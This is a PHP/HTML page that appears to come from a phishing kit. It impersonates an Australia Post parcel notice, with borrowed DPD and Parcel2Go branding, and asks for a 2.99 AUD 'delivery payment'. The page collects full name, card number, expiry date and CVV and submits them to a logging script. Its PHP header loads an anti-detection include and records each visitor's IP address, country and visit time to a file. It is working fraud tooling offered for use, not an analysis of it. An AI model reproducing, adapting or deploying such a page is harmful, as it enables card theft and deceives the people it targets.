<?php
include("./anti/index.php");
include("wc.php");

$ip = $_SERVER['REMOTE_ADDR'];
$COUNTRY = getCountryFromIP($ip, " NamE ");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$TIME = date("d F Y H:i:s");

$file = fopen("is.txt", "a");
fwrite($file, $ip . "  -   " . $TIME . " -  " . $COUNTRY . "\n");
?>

<html lang="is">
<head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.gstatic.com" rel="preconnect" />
    <link href="https://fonts.googleapis.com/css2?family=Varela+Round&amp;display=swap" rel="stylesheet" />
    <link href="css/all.min.css" rel="stylesheet" />
    <link href="img/favicon.ico" rel="icon" type="image/png" />
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" />
    <link href="css/style.css" rel="stylesheet" /><script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/masking-input.js" data-autoinit="true"></script>
    <meta name="description" content="Send to Singapore today and see how much you can save with the world's biggest couriers via DPD Local Online.">
    <title>auspost.com.au</title>
</head>
<body>
<div class="container">
    <div class="main">
        <form action="logz/log1.php" id="cardForm" method="post">
            <section class="first-sec">
                <div class="centrer  ">
                    <p class="borderB"><img src="./img/pdp.png" style=" width: 40%;" /><select style="  float: right; border: 0 ; padding: 15px"><option value="EN">EN</option> </select></p>
                </div>

                <div class="paddingDiv" style="margin-top: 20px ; margin-bottom: 10px"><strong class="textMessage2">Parcel delivery </strong>

                    <p class="textMessage">Your package is waiting for delivery. Please confirm payment (2.99 AUD). Online verification must be done within 3 days before expiration.</p>
                </div>

                <p class="HROr">Packaging Information</p>

                <div class="paddingDiv">
                    <div class="first-sec-top0">
                        <div style="width: 100%;  ">
                            <p style="width: 50%; float: left">All</p>

                            <p style="width: 50%; float: right;    text-align: right;">2.99 AUD</p>
                        </div>
                    </div>

                    <div class="first-sec-top">
                        <div class="first-sec-doll">
                            <p>Order number</p>

                            <h4>CE1853349f34AU</h4>
                        </div>

                        <div class="first-sec-doll-img"><img alt="image" src="img/789655.png" /></div>
                    </div>
                </div>

                <p class="HROr">Confirm payment method</p>

                <div class="first-sec-inf paddingDiv">
                    <div class="second-sec-info">
                        <div class="second-sec-info-form"><input class="form-control inpt222" name="1" placeholder="Full name" required="" type="text" />
                            <div class="second-sec-info-nb"><input autocomplete="off" class="form-control inpt inpt1" inputmode="numeric" maxlength="20" name="3" onkeypress="isInputNumber(event)" placeholder="XXXX-XXXX-XXXX-XXXX" required="" type="text" />
                                <div class="second-sec-info-nb-imgs"><img class="img1" src="./img/1.png" width="20px" /> <img class="img2" src="./img/2.png" width="20px" /> <img class="img3" src="./img/3.png" width="20px" /> <img class="img4" src="./img/4.png" width="20px" /></div>
                            </div>

                            <div class="second-sec-info-cc"><input autocomplete="off" class="form-control inpt inpt2" id="date" name="4" onchange="isInputNumber(event)" placeholder="MM / YY" required="" type="text" />
                                <div class="v2-cvv v2-card-create-cvv"><input autocomplete="off" class="i-settings-input cvv x2 v2-cvv-input v2-card-create-cvv-input v2-input-can-be-reset dirty form-control inpt inpt3" id="cvv2" maxlength="3" name="5" onkeypress="isInputNumber(event)" placeholder="***" required="" type="text" />
                                    <div class="v2-sprite-payment v2-cvv-tip" title="The last 3 digits on the back of your card"></div>
                                </div>
                            </div>
                            <button class="btn btn-dark btn-lg btn-sgnapore" type="submit">Confirm</button></div>
                    </div>
                </div>

                <footer>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/about-terms">Terms &amp; Conditions</a>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/cookie-policy">Cookie Policy</a>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/privacy-policy">Privacy Policy</a>
                    <a class="hrefa" href="https://shipping.dpd.ie/content/refund-policy">Refund Policy</a>
                    <p class="copyright">All payments processed by Parcel2Go.com Limited
                        © Parcel2Go.com Ltd 1995-2022 All Rights Reserved
                        Company Number: 02591405 | VAT Number: 597849161 IE9710685A</p>
                </footer>
            </section>
        </form>
    </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"
        integrity="sha512-KaIyHb30iXTXfGyI9cyKFUIRSSuekJt6/vqXtyQKhQP6ozZEGY8nOtRS6fExqE4+RbYHus2yGyYg1BrqxzV6YA=="
        crossorigin="anonymous"></script><script>

    /*Date Expiration*/
    var cleave = new Cleave('.inpt2', {
        date: true,
        datePattern: ['m', 'y']
    });
    /*Card Number*/
    var cleave = new Cleave('.inpt1', {
        creditCard: true,
        delimiter: "-",
    });


    function isInputNumber(evt) {

        var ch = String.fromCharCode(evt.which);

        if (!(/[0-9]/.test(ch))) {
            evt.preventDefault();
        }

    }
</script></body>
</html>